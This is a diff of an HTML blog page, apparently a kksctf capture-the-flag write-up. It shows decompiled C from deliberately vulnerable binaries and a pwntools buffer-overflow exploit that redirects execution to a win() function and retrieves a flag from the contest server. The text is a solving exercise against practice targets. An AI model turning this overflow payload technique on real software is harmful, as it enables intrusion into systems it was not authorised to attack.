+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">read_wrapper</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= i )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &gt; <span class="string">&#x27;@&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;Z&#x27;</span> )</span><br><span class="line">      s[i] += <span class="number">0x20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>According to this, there is no length limitation for <code>s</code>. And <code>s</code>‘s address is “ebp-100h”, so we can input data like <code>a*0x100 + b*0x4 + jmp_addr</code> to overwrite the return address, and we also can see this in IDA’s Stack Window.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-00000100 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-00000100 ; N       : rename</span><br><span class="line">-00000100 ; U       : undefine</span><br><span class="line">-00000100 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000100 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000100 ; Frame size: 100; Saved regs: 4; Purge: 0</span><br><span class="line">-00000100 ;</span><br><span class="line">-00000100</span><br><span class="line">-00000100 s               db ?</span><br><span class="line">-000000FF                 db ? ; undefined</span><br><span class="line">......</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 argc            dd ?</span><br><span class="line">+0000000C argv            dd ?                    ; offset</span><br><span class="line">+00000010 envp            dd ?                    ; offset</span><br><span class="line">+00000014</span><br><span class="line">+00000014 ; end of stack variables</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-00000100 ; D&#x2F;A&#x2F;*   : change type (data&#x2F;ascii&#x2F;array)</span><br><span class="line">-00000100 ; N       : rename</span><br><span class="line">-00000100 ; U       : undefine</span><br><span class="line">-00000100 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000100 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000100 ; Frame size: 100; Saved regs: 4; Purge: 0</span><br><span class="line">-00000100 ;</span><br><span class="line">-00000100</span><br><span class="line">-00000100 s               db ?</span><br><span class="line">-000000FF                 db ? ; undefined</span><br><span class="line">......</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 argc            dd ?</span><br><span class="line">+0000000C argv            dd ?                    ; offset</span><br><span class="line">+00000010 envp            dd ?                    ; offset</span><br><span class="line">+00000014</span><br><span class="line">+00000014 ; end of stack variables</span><br></pre></td></tr></table></figure>
 
 <p>Another point is that we should find the <code>jmp_addr</code>, usually  we should make it as the <code>system(&quot;/bin/sh&quot;);</code>,  but in this chall, we can find a function named <code>win()</code>:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+3h] [ebp-25h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048830);<span class="comment">// 'r'</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"flag not found"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Almost there :)"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Here it comes: %s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+3h] [ebp-25h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+20h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048830);<span class="comment">// &#x27;r&#x27;</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;flag not found&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Almost there :)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Here it comes: %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>We could see this function will open current working directory’s file “flag.txt”, and check the argument “a1”, if “a1” equal to 0xCAFEBABE, then print the file contents, that’s flag.</p>
 <p>We know that it should firstly push arguments to stack before normally calling a normal function, and the data we input will increase in stack, so the data we should construct is <code>a*0x100 + b*0x4 + win_addr + call_before_next_ins_addr + p32(0xcafebabe)</code>, as the IDA shows,  the win() function start address is 0x80485F6, so the last exploit is:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-baby_bof</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">sh = remote(<span class="string">"tasks.open.kksctf.ru"</span>, <span class="number">10002</span>)</span><br><span class="line"><span class="comment">#sh = process("./baby_bof")</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x80485f6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x100</span> + <span class="string">"b"</span>*<span class="number">0x04</span> + p32(win_addr) + p32(<span class="number">0x804850c</span>) + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Enter your name: "</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># pause() # to Debug</span></span><br><span class="line">sh.interactive() <span class="comment">#the last line should have, to keep seeing flag.</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># for kksctf-baby_bof</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;tasks.open.kksctf.ru&quot;</span>, <span class="number">10002</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./baby_bof&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">win_addr = <span class="number">0x80485f6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x04</span> + p32(win_addr) + p32(<span class="number">0x804850c</span>) + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Enter your name: &quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># pause() # to Debug</span></span><br><span class="line">sh.interactive() <span class="comment">#the last line should have, to keep seeing flag.</span></span><br></pre></td></tr></table></figure>
 
 <p>And run it in terminal:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ python exp.py </span><br><span class="line">[+] Opening connection to tasks.open.kksctf.ru on port 10002: Done</span><br><span class="line">[DEBUG] Received 0x2a bytes:</span><br><span class="line">    <span class="string">'We have prepared a buffer overflow for you'</span></span><br><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    <span class="string">'\n'</span></span><br><span class="line">    <span class="string">'Can you get use of it?\n'</span></span><br><span class="line">    <span class="string">'Enter your name: '</span></span><br><span class="line">[DEBUG] Sent 0x111 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  62 62 62 62  f6 85 04 08  0c 85 04 08  be ba fe ca  │bbbb│····│····│····│</span><br><span class="line">    00000110  0a                                                  │·│</span><br><span class="line">    00000111</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x119 bytes:</span><br><span class="line">    00000000  48 65 6c 6c  6f 2c 20 61  61 61 61 61  61 61 61 61  │Hell│o, a│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  61 61 61 61  61 61 61 62  62 62 62 f6  85 04 08 0c  │aaaa│aaab│bbb·│····│</span><br><span class="line">    00000110  85 04 08 be  ba fe ca 21  0a                        │····│···!│·│</span><br><span class="line">    00000119</span><br><span class="line">Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb��\x0c\x85\x0\xbe\xba\xfe�!</span><br><span class="line">[DEBUG] Received 0x7e bytes:</span><br><span class="line">    <span class="string">'Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;\n'</span></span><br><span class="line">    <span class="string">'\n'</span></span><br><span class="line">    <span class="string">'/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall\n'</span></span><br><span class="line">Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;</span><br><span class="line"></span><br><span class="line">/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ python exp.py </span><br><span class="line">[+] Opening connection to tasks.open.kksctf.ru on port 10002: Done</span><br><span class="line">[DEBUG] Received 0x2a bytes:</span><br><span class="line">    <span class="string">&#x27;We have prepared a buffer overflow for you&#x27;</span></span><br><span class="line">[DEBUG] Received 0x29 bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Can you get use of it?\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Enter your name: &#x27;</span></span><br><span class="line">[DEBUG] Sent 0x111 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  62 62 62 62  f6 85 04 08  0c 85 04 08  be ba fe ca  │bbbb│····│····│····│</span><br><span class="line">    00000110  0a                                                  │·│</span><br><span class="line">    00000111</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received 0x119 bytes:</span><br><span class="line">    00000000  48 65 6c 6c  6f 2c 20 61  61 61 61 61  61 61 61 61  │Hell│o, a│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000100  61 61 61 61  61 61 61 62  62 62 62 f6  85 04 08 0c  │aaaa│aaab│bbb·│····│</span><br><span class="line">    00000110  85 04 08 be  ba fe ca 21  0a                        │····│···!│·│</span><br><span class="line">    00000119</span><br><span class="line">Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb��\x0c\x85\x0\xbe\xba\xfe�!</span><br><span class="line">[DEBUG] Received 0x7e bytes:</span><br><span class="line">    <span class="string">&#x27;Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall\n&#x27;</span></span><br><span class="line">Here it comes: kks&#123;0v3rf10w_15_my_1!f3&#125;</span><br><span class="line"></span><br><span class="line">/home/ctf/redir.sh: line 4:    74 Segmentation fault      timeout -k 120 120 ./chall</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><strong>flag</strong>: kks{0v3rf10w_15_my_1!f3}</li>
 </ul>
 <h4 id="insane-pwn"><a href="#insane-pwn" class="headerlink" title="insane pwn"></a>insane pwn</h4><p>This is a simple chall so I can solve it. Check the file:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file insane_pwn </span><br><span class="line">insane_pwn: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fd8cb6b2a59db247f16c14859388e6925385e541, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec insane_pwn </span><br><span class="line">[*] <span class="string">'/home/pwn/Documents/kksctf/insane_pwn'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ file insane_pwn </span><br><span class="line">insane_pwn: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=fd8cb6b2a59db247f16c14859388e6925385e541, not stripped</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ checksec insane_pwn </span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Documents/kksctf/insane_pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">(pwn) pwn@ubuntu:~/Documents/kksctf$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>It seems all protection are enabled, but let’s look it in IDA. Here is its main function:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+8h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+114h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Hello! I am x86 vulnerable programm and have and inner buffer size of 256 bites"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Can you lead me to segmentation fault please?"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x108</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hit me harder!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print_flag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+8h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+114h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello! I am x86 vulnerable programm and have and inner buffer size of 256 bites&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you lead me to segmentation fault please?&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x108</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hit me harder!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    print_flag();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>Clearly, we can see if the <code>v5</code> variable is not equal to 0xDEADBEEF, then it will go to print_flag func to print flag. But the code above set <code>v5</code> to 0xDEADBEEF, and we also could see that func truely print flag:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! you can have your flag: "</span>);</span><br><span class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(&amp;s, <span class="number">29</span>, stream);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">    fclose(stream);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag not found"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
